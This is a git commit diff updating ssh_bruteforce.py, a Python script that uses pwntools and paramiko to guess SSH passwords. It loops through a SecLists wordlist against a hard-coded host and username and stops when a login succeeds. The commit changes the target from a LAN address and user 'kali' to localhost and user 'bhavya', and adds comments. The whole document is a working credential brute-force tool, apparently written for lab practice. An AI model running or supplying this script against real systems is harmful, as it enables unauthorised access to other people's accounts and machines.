49dd52b32f5b50d600508ca0e44d60b4149e800a
bhavya290 <54769226+bhavya290@users.noreply.github.com>
2024-11-03 01:32:32 +0530

    Update ssh_bruteforce.py

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -1,21 +1,28 @@
 from pwn import *
 import paramiko
 
-host = "192.168.123.146" #modify host and username as you need
-username ="kali"
-attempts=0
+host = "127.0.0.1" #assign target ip address
+username = "bhavya" #Define username
+attempts = 0
 
-with open( "ssh-common-passwords.txt", "r") as password_list: #specify wordlist
-	for password in password_list:
-		password = password.strip("\n")
-		try:
-			print("[{}] Attempting password: '{}'!".format(attempts, password))
-			response = ssh(host=host, user=username, password=password, timeout=1)
-			if response. connected():
-				print( "[>] Valid password found:'{}''!".format(password))
-				response.close()
-				break
-			response.close()
-		except paramiko.ssh_exception.AuthenticationException:
-			print("[X] Invalid password!")
-		attempts += 1
+#read passwords file
+with open("/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt", "r") as password_list:
+    for password in password_list:
+        password = password.strip("\n")
+        try:
+            print("[{}] Attempting password: '{}'".format(attempts, password))
+            #using pwntools
+            response = ssh(host=host, user=username, password=password, timeout=1) #You can also specify port using "port = 22"
+            
+            #authentication successful
+            if response.connected():
+                print("[>] Valid password found: '{}'".format(password))
+                response.close()
+                break
+            
+            #invalid password
+            response.close()
+        except paramiko.ssh_exception.AuthenticationException:
+            print("[X] Invalid password!")
+        
+        attempts += 1
